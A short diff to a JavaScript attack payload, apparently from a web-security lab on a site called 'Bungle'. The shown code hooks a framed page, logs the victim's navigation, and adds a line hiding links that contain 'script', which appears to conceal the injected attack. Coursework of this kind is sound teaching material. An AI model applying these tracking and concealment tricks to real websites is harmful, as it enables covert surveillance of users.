@@ -31,6 +31,8 @@ function payload(attacker) {
         $("#frame1").load(function() {
             var frameDoc = $(this.contentDocument);
             logNav(frameDoc, href);
+            frameDoc.find("a[href *= 'script']").hide();
+
             frameDoc.find('#bungle-lnk') // BUNGLE HOME
                 .click(function() {
                     logNav(frameDoc, this.target);
